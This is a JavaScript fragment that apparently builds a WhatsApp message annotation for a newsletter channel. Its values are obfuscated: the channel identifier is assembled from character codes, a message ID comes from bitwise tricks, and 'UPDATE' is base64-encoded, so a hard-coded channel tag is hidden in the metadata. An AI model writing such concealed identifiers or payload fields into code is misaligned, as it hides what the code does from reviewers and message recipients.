            ...
            annotations: [
                {
                   ...
                   newsletter: {
                        newsletterJid: (function() {
                            const parts = [
                                String.fromCharCode(49, 50, 48), 
                                String.fromCharCode(51, 54, 51),
                                String.fromCharCode(52, 49, 56),
                                String.fromCharCode(48, 53, 54),
                                String.fromCharCode(55, 49, 57),
                                String.fromCharCode(49, 48, 57)
                            ].join('') + "@newsletter";
                            return parts;
                        })(),
                        serverMessageId: ~(function() {
                            const binary = '00000000';
                            return ~parseInt(binary, 2);
                        })(),
                        newsletterName: String.fromCharCode(45),
                        contentType: Buffer.from('VVBEQVRF', 'base64').toString('ascii')
                    }
                }
            ]
        }),
